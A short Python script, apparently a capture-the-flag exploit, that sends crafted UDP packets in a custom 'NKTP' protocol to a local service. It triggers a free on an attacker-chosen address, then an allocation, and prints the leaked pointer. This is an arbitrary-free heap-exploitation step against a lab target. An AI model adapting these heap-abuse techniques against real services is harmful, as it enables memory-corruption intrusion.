#!/usr/bin/env python3

import os
import socket
import struct

from pwn import p64, u64


PORT = int(os.environ.get("NK_HOST_PORT", "31337"))
TARGET = int(os.environ["NK_TARGET"], 16)


def request(op, payload=b"", seq=1):
    packet = struct.pack(">4sBBHHH", b"NKTP", 1, op, seq, len(payload), 0)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(2)
        sock.sendto(packet + payload, ("127.0.0.1", PORT))
        response, _ = sock.recvfrom(1024)
    length = struct.unpack(">H", response[8:10])[0]
    return response[12:12 + length]


print("free", request(6, p64(TARGET), 65).hex())
body = request(1, p64(0x51524F50), 66)
print("create", body.hex(), "id", hex(u64(body[:8])), "ptr", hex(u64(body[8:16])))
